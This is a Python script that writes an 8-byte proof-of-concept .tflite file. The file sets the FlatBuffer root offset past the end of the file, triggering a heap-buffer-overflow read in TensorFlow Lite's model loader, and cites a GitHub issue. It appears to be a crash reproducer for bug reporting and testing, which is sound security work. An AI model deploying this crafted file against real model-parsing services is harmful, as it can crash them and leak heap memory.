#!/usr/bin/env python3
"""Generate the 8-byte PoC .tflite that triggers heap-buffer-overflow in
FlatBufferModel::BuildFromBuffer.

Source: https://github.com/tensorflow/tensorflow/issues/115308 (issue body).

The first 4 bytes are the FlatBuffer root-table offset (attacker-controlled).
0x18 places the "table" past the file end so flatbuffers::ReadScalar<int>()
reads OOB heap memory. The 4-byte file_identifier "TFL3" is what tflite
expects.
"""
import struct
import sys

with open(sys.argv[1] if len(sys.argv) > 1 else 'crash.tflite', 'wb') as f:
    f.write(struct.pack('<I', 0x18) + b'TFL3')
print(f"wrote {sys.argv[1] if len(sys.argv) > 1 else 'crash.tflite'} (8 bytes)")
